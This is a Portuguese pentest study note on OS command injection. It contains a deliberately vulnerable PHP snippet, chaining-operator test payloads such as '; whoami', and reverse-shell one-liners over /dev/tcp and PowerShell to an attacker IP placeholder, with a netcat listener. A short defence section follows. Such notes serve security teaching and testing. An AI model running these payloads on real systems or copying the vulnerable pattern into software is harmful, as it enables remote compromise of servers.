# 🖥️ Command Injection — Execução de Comandos via Input da Aplicação

> Ocorre quando a aplicação passa input do usuário diretamente para um comando de sistema operacional sem sanitização, permitindo executar comandos arbitrários no servidor.

---

## 🧠 O Que é Command Injection

Comum em painéis web que expõem funcionalidades de rede (ping, traceroute, nslookup) chamando ferramentas do sistema por trás:
```php
system("ping -c 1 " . $_GET['host']);
```

Se `host` não for validado, dá pra encadear comandos extras.

---

## 🔗 Operadores de Encadeamento

| Operador | Comportamento |
|---|---|
| `;` | Executa o segundo comando independente do resultado do primeiro |
| `&&` | Executa o segundo comando só se o primeiro tiver sucesso |
| `\|` | Pipe — saída do primeiro vira entrada do segundo |
| `\|\|` | Executa o segundo comando só se o primeiro falhar |
| `` ` ` `` ou `$()` | Substituição de comando (executa e injeta o resultado) |

---

## 🔍 Payloads de Teste

127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1 whoami
127.0.0.1 $(whoami)


**Onde testar:** qualquer campo que pareça invocar ferramenta de sistema — ping, DNS lookup, conversão de arquivo, geração de relatório.

---

## 🔁 Workflow de Teste
Identificar funcionalidade que parece chamar comando de sistema (ping, lookup)
Injetar operador básico: ; whoami
Comparar resposta com e sem o payload
Se retornar output do whoami → confirmado
Evoluir pra reverse shell:
; bash -i >& /dev/tcp/SEU_IP/4444 0>&1

---

## 🐚 De Command Injection para Reverse Shell

```bash
# Linux
; bash -i >& /dev/tcp/SEU_IP/4444 0>&1

# Windows (PowerShell one-liner)
; powershell -e BASE64_ENCODED_REVERSE_SHELL
```

*(Listener no Kali antes de disparar: `nc -lvnp 4444`)*

---

## ⚠️ Detecção e Defesa
Evitar chamar comandos de sistema com input do usuário (usar bibliotecas nativas da linguagem)
Whitelist rígida de caracteres permitidos no input
Sandboxing / containers com privilégio mínimo
WAF pode bloquear operadores óbvios, mas é bypassável com encoding

---

## 📌 Relacionados

- [[LFI RFI]]
- [[ASP Webshell — Conceito e Uso em Pentest]]
- [[Payloads com msfvenom]]

#web #commandinjection #exploração #rce